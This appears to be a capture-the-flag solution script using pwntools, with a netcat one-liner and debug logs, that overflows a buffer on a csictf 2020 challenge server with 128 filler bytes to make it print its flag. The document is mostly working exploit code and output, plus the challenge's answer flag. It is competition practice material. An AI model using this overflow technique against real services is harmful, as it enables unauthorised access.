from pwn import *
context(log_level="debug")

p = remote('chall.csivit.com', 30041)
p.recvuntil('?')

payload = 'A'*16+'B'*4+'C'*108
p.sendline(payload)
p.interactive()

'''
# Use command line directly:
#
giantbranch@ubuntu:~/ctf/20200720-csictf$ python -c "print 'A'*16 + 'B'*4 + 'C'*108"| nc chall.csivit.com 30041
What is the secret phrase?
Shhh... don't tell anyone else about AAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC,csivit{Bu!!er_e3pl01ts_ar5_5asy}

# result:
giantbranch@ubuntu:~/ctf/20200720-csictf$ python exp_security.py
[+] Opening connection to chall.csivit.com on port 30041: Done
[DEBUG] Received 0x1b bytes:
    'What is the secret phrase?\n'
[DEBUG] Sent 0x81 bytes:
    'AAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC\n'
[*] Switching to interactive mode

[DEBUG] Received 0x25 bytes:
    "Shhh... don't tell anyone else about "
Shhh... don't tell anyone else about [DEBUG] Received 0xa2 bytes:
    'AAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC,csivit{Bu!!er_e3pl01ts_ar5_5asy}\n'
    '\n'
AAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC,csivit{Bu!!er_e3pl01ts_ar5_5asy}

[*] Got EOF while reading in interactive
$
'''
